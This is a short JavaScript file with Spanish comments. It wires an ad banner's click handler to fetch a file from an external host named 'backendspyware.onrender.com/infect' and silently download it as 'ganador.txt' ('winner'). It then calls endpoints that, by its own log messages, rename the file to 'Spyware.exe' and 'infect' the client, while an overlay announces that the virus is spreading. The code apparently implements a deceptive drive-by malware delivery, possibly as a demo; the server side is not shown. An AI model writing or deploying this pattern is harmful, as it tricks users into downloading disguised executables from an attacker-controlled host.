document.getElementById('adBanner').addEventListener('click', function() {
  var overlay = document.getElementById('virusOverlay');
  overlay.classList.add('active');
  const apiDeployed = 'https://backendspyware.onrender.com/infect';
  const apiLocal = 'http://localhost:3000/infect';

  // Llamada a la API externa
  fetch(apiDeployed)
    .then(response => response.blob())
    .then(blob => {
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.style.display = 'none';
      a.href = url;
      a.download = 'ganador.txt';
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      overlay.innerHTML = '<p>El virus se está propagando...</p><p>¡Cuidado!</p>';

      // Llamada a la API para renombrar el archivo
      fetch('/rename-file', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ filename: 'ganador.txt' })
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          console.log('Archivo renombrado a Spyware.exe');
        } else {
          console.error('Error al renombrar el archivo:', data.error);
        }

        // Llamada al endpoint infectClient
        fetch('/infectClient', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          }
        })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            console.log('Cliente infectado correctamente');
          } else {
            console.error('Error al infectar el cliente:', data.error);
          }
        })
        .catch(error => {
          console.error('Error al infectar el cliente:', error);
        });

      })
      .catch(error => {
        console.error('Error al renombrar el archivo:', error);
      });
    })
    .catch(error => {
      console.error('Error al consumir la API:', error);
      overlay.innerHTML = '<p>Error al propagar el virus.</p>';
    });
});